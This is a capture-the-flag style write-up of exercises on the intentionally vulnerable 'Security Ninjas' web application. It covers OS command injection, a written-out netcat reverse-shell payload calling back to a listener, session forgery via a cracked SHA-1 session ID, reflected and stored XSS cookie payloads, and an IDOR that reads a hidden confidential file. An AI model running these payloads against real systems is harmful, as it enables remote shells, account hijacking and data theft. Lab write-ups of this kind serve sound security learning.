This is a Vulnerable Machine ```Security Ninjas```.

We can test this for common web vulnerabilities

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/daaddc57-1780-4268-b995-afff747dbbaf)

Well, lets dig in

We were told that this page has an ```OS Command Injection``` flaw

Lets provide a domain name say ```google.com```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84db4b64-e987-4ed0-9fcb-eee65f7835f9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/89c48ad7-31a2-4491-9d29-a7c7f0085987)

So we got the whois look up results for the domain name ```google.com```

The ```semicolon(;)``` is often used as a delimiter so seperate multiple commands within a single input field. So, we can try to use the ```semicolon(;)``` character to run multiple commands.

For example lets say we want to run the ```id``` command alongside the domain name we provided. So, we'll be having an input like this ```google.com;id```

Lets try to execute this to see what happens

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/730ee60f-38a8-4c9a-85a4-5cf2f525d477)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7a23174f-f258-4b4d-8bad-91b5efffcb21)

Scrolling down,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6cef73f1-ffc0-4d30-858d-a7a1e4217465)

It worked hehe, we were able to successfully execute the linux command

Other delimiter characters like ```|``` and ```||``` also works

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a25768ec-3be8-489a-9333-e3c310810ef2)

Lets get a reverse shell from this

payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```

Ensure you set up a netcat listener

So, our input would look like this ```google.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.168 1234 >/tmp/f```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6f015db-919f-44b6-82ef-1c31a1c74737)

Checking my netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/26861a22-4676-4f97-af6f-8a515b1e3055)

I was able to get a reverse shell.

Well, that's all for this challenge since we've successfully exploited the vulnerability there.

So the exercise here is to get ```user2``` personal information by exploiting the ```Broken Authentication and Session Management``` vulnerability

Lets try to login with the details they provided to us

username:```user1```        password:```145_Bluxome```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa96800c-803b-4392-aa4e-c3089c40e40d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8aca000-2109-4af5-b21d-b80d262b5051)

Cool, we are logged in

Lets try to view personal details, but this time we'll capture the request to burpsuite and send it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2dce07c1-a515-4bef-9e4e-f8567e4b1394)

We were able to view the personal information of ```user1```. Well, something eyes catching here is the ```sessionID```.

I ran ```hash-identifier``` on that hash and found

```

 HASH: b3daa77b4c04a9551b8781d03191fe098f325e67

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```
Cool, the hash is ```SHA-1```. Lets crack it to see what it says

Save the hash in a file and use john

command:```john hash  --wordlist=/home/bl4ck4non/Documents/rockyou.txt --format=RAW-sha1```

```
â”Œâ”€â”€(bl4ck4nonã‰¿bl4ck4non)-[~]

```
John cracked the hash to be ```user1```. 

So, we can say the ```sessionID``` is ```user1```.

To read ```user2``` personal information, what we can do is generate a ```sha1``` hash for ```user2```.

I used this [website](https://codebeautify.org/sha1-hash-generator) for that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ff21b9eb-2391-4942-8983-6e12d16d59d7)

Now. we'll be replacing the previous ```sessionID``` value with ```a1881c06eec96db9901c7bbfe41c42a3f08e9cb4```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f23c1c76-e085-444c-8214-959c89fc97fd)

cool cool, we are able to read the personal information for ```user2```.

That will be all for this challenge since we have successfully exploited the vulnerabilityðŸ˜Ž

We have both ```Reflected XSS``` and ```Stored XSS``` here.

Lets start with ```Reflected XSS```

### Reflexted XSS

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/af6179f2-80f0-4737-8412-c84b0c9c761d)

Well, my name is ```BlackAnon```, lets try that

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/063cf694-f826-436f-be3f-c61e8c1971f5)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5a93b51d-abbd-437e-b070-57b2738d469e)

Lets try a simple javascript payload ```<script>alert(1)</script>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fff508ea-5f99-4e09-8e92-afbfb4b72d61)

The payload got executed successfully. Lets try to steal some cookies ```<script>alert(document.cookie)</script>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1c051c2e-b22b-4591-b3f0-cc8365600ffe)

Nice nice, we have successfully exploited this vulnerability.

Moving on to ```Stored XSS```

### Stored XSS

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5bcfb808-d9a5-4aef-aff4-35aaea4d1e0f)

Lets try to provide some inputs

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/198b6bf0-32c1-4e98-bab5-51c0223ed813)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fbc469e3-1f91-4626-9b86-6845f0bf2b56)

Now, stored xss occurs when an application allows users to store data that includes malicious scripts on the server, and then serves that data to other users who view the affected page. This allows the attacker to execute their malicious code in the context of other users' browsers, potentially leading to various security risks.

This means our payload will be stored and executed when a user performs an action in the affected page.

Lets inject the ```Name``` parameter with a simple javascript payload ```<script>alert(1)</script>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe3672ff-021a-439a-b460-b82d39ff49ad)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7bfdbb6d-8176-41f0-9b57-e30faa485172)

Account creation was successful. Our payload will get executed when a user tries to view all the users in the database by clicking ```View Users```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/71966178-80d9-47b9-bdeb-ba6d00865d00)

You can see it worked.

Lets try to steal cookies this time with the payload ```<script>alert(document.cookie)</script>```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bf39b325-0a2b-4573-bdb1-7cecb6dcc206)

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/169e10e5-528d-4b30-b4a8-635e487d9463)

Our payload got executed successfully.

We have successfully exploited both ```Reflected XSS``` and ```Stored XSS```

So the task is to exploit the ```IDOR``` vulnerability and find a confidential document on the server.

Lets try to view the non-confidential document

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7e0b0ad7-be22-4c38-b787-14f15915fdc0)

We get this. Well, the name of the pdf looks suspiciousðŸ¤”

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2f17502-9ac8-40c2-9792-9b1aa511dba8)

This looks like ```hex```, well lets use [cyberchef](https://gchq.github.io/CyberChef/) to decode

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a737a865-28f0-41d1-a2f7-16f64aea2e7d)

The hex was decoded to be the word ```non_confidential```. So, the way the document is named was by encoding the ```non_confidential``` word to ```hex```

This means to view the confidential document we have to encode the word ```confidential``` to ```hex```

Using [cyberchef](https://gchq.github.io/CyberChef/) to encode

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f1a56b21-1445-42e8-bc3f-3d1f6953567b)

Lets replace ```6e6f6e5f636f6e666964656e7469616c.pdf``` with ```636f6e666964656e7469616c.pdf```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c78e3ef1-36a2-4b53-9e45-73e1f0d4ff48)

We were able to successfully view the confidential document. This means we have successfully completed this exerciseðŸ˜Ž
